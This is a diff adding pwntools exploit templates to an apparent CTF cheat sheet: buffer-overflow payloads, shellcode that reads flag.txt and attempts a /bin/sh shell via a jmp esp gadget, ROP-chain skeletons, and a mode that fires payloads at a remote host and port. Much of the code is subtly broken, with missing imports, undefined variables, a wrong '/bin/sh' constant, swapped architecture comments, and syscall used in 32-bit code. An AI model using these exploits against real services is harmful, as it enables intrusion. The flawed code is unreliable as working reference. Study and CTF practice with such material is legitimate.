@@ -896,6 +896,213 @@ binsh = next(libc.search(b'/bin/sh'))
 - `ssh` tube works like a normal tube — truly interchangeable
 - Libc database lookup: `libc = ELF('./libc.so.6')` then `libc.libc_start_main_return`
 
+### Example Scripts
+- `Basic checking manually`
+```python
+from pwn import (p32,ELF)
+file = ELF('') #filename
+proc = file.process() #process
+target = p32(file.symbols["hacked"])    #function
+payload = b"".join([
+    b"A" * 28,
+    target,
+    p32(0xdeadbeef),
+    ])
+proc.sendlineafter(b":",payload)
+print(proc.recvall().decode('latin-1'))
+#proc.interactive()     #interactive mode
+```
+
+- `With argparse for both remote and local exploitation`
+```python
+import argparse
+from pwn import (p32,ELF,ROP,gdb,remote,log,context,process, warning,cyclic,cyclic_find,info)
+
+def find_position(file):
+    process = file.process()
+    process.sendlineafter(b':', cyclic(200))
+    process.wait()
+    ip_offset = ""
+    if ELF.bits == 32:
+        ip_offset = cyclic_find(process.corefile.pc)
+    elif ELF.bits == 64:
+        ip_offset = cyclic_find(process.corefile.read(process.corefile.sp, 8))
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return int(ip_offset)
+
+def setup_target():
+    parser = argparse.ArgumentParser(description="Binary interaction template")
+    subparsers = parser.add_subparsers(dest="mode", required=True, help="Mode of operation")
+
+    local_parser = subparsers.add_parser("local", help="Run against a local process")
+    local_parser.add_argument("type", default="normal",choices=["debug","normal","rop"], help="Select the type of local way to run")
+    local_parser.add_argument("binary", help="Path to local binary")
+
+    remote_parser = subparsers.add_parser("remote", help="Connect to a remote service")
+    remote_parser.add_argument("host", help="Remote host (required for remote mode)")
+    remote_parser.add_argument("port", type=int, help="Remote port (required for remote mode)")
+    remote_parser.add_argument("binary", help="Path to local binary")
+
+    args = parser.parse_args()
+
+    try:
+        elf = ELF(args.binary)
+        context.binary = elf
+    except FileNotFoundError as f:
+        log.warning(f"Could not load ELF file: {f}")
+    except Exception as e:
+        log.warning(f"unknown error: {e}")
+
+    if args.mode == "local":
+        if args.type == "normal":
+            log.info(f"Starting local process: {args.binary}")
+            #this is an example
+            file = ELF(args.binary)
+            proc = file.process()
+
+            context.arch = file.arch
+            context.os = file.os
+            shellcode = asm(shellcraft.cat('flag.txt'))
+            shellcode += asm(shellcraft.exit())
+            shellcode += asm("""
+                            xor eax,eax
+                            push eax,
+                            mov ebx, 0x68732f6e9622f2
+                            push ebx
+                            mov edi, esp
+                            push eax
+                            push edi
+                            mov edi, esp
+                            mov al, 59
+                            syscall
+                             """)
+            jmp_esp = asm('jmp esp')
+            jmp_esp = next(file.search(jmp_esp))
+            payload = flat(
+                    asm('nop') * find_position(file),
+                    next(file.search(asm('jmp esp'))),
+                    asm('nop') * 16,
+                    shellcode
+                    )
+            open('payload',"wb").write(payload)
+            proc.sendlineafter(b"After something: ",payload)
+            print(proc.recvall().decode('latin-1'))
+            #proc.interactive()
+        elif args.type == "debug":
+            log.info(f"Starting local process: {args.binary} in GDB")
+            #Write your gdb script here
+            gdbscripts = """
+
+            """
+            file = ELF(args.binary)
+            proc = file.process()
+            pid = gdb.attach(proc,gdbscript=gdbscripts)
+            payload = flat(b"A" * find_position(file),p32(file.functions.xxxxxxx.address),p32(0x0))
+
+            open('payload',"wb").write(payload)
+            proc.sendlineafter(b"After something: ",payload)
+            print(proc.recvall().decode('latin-1'))
+            #proc.interactive()
+        elif args.type == "rop":
+            log.info(f"Starting local process: {args.binary} implemented in ROP-chain")
+            #This is a sample rop
+            file = ELF(args.binary)
+            proc = file.process()
+            # payload = b"A" * find_position(file) + p32(file.functions.xxxxxxx.address) + p32(0x0)
+            rop = ROP(file)
+            rop.xxxxxxx("arg1","arg2")
+            payload = flat({
+                offset: rop.chain()
+            })
+            open('payload',"wb").write(payload)
+            proc.sendlineafter(b'After something: ',payload)
+            print(proc.recvall())
+            #proc.interactive()
+        
+    elif args.mode == "remote":
+        if not args.host or not args.port:
+            parser.error("Remote mode requires both --host and --port arguments.")
+        else:
+            log.info(f"Connecting to remote target: {args.host}:{args.port}")
+            file = ELF(args.binary)
+            proc = remote(args.host,args.port)
+            payload = flat(b"A" * find_position(file),p32(file.functions.xxxxxxx.address),p32(0x0))
+            open('payload',"wb").write(payload)
+            proc.sendlineafter(b"After something: ",payload)
+            print(proc.recvall().decode('latin-1'))
+            #proc.interactive()
+
+def main():
+    setup_target()
+
+if __name__ == "__main__":
+    main()
+
+```
+- `With GDB`
+```python
+from pwn import (p32,ELF,gdb)
+def find_position(file):
+    process = file.process()
+    process.sendlineafter(b':', cyclic(200))
+    process.wait()
+    ip_offset = ""
+    if ELF.bits == 32:
+        ip_offset = cyclic_find(process.corefile.read(process.corefile.sp, 4))  # x64
+    elif ELF.bits == 64:
+        ip_offset = cyclic_find(process.corefile.pc)  # x86
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return int(ip_offset)
+
+gdbscripts = """
+
+"""
+file = ELF(args.binary)
+proc = file.process()
+pid = gdb.attach(proc,gdbscript=gdbscripts)
+payload = b"A" * find_position(file) + p32(file.functions.xxxxxxx.address) + p32(0x0)
+
+write('payload',payload)
+proc.sendlineafter(b"After something: ",payload)
+print(proc.recvall().decode('latin-1'))
+#proc.interactive()
+```
+
+- `With ROP-chains`
+```python
+from pwn import (p32,ELF,rop,gdb)
+def find_position(file):
+    process = file.process()
+    process.sendlineafter(b':', cyclic(200))
+    process.wait()
+    ip_offset = ""
+    if ELF.bits == 32:
+        ip_offset = cyclic_find(process.corefile.read(process.corefile.sp, 4))  # x64
+    elif ELF.bits == 64:
+        ip_offset = cyclic_find(process.corefile.pc)  # x86
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return int(ip_offset)
+
+file = ELF(args.binary)
+proc = file.process()
+# payload = b"A" * find_position(file) + p32(file.functions.xxxxxxx.address) + p32(0x0)
+rop = ROP(file)
+rop.xxxxxxx("arg1","arg2")
+payload = flat({
+offset: rop.chain()
+})
+proc.sendlineafter(b'After something: ',payload)
+print(proc.recvall())
+#proc.interactive()
+```
+
+> [!NOTE]
+> You'd do the following mostly when it comes to x86 and x86/64
+> x86/64: flat(junk,pop rdi,address/arguments,base address)
+> x86: flat(junk,address,base address,another address/arguments)
+> again base address in x86 can be anything like 0x0
+> but in x86/64 you'd need to put the actual address of the base function which we call on behalf.
+
 ---
 
 ## 9. Frida - Dynamic Instrumentation
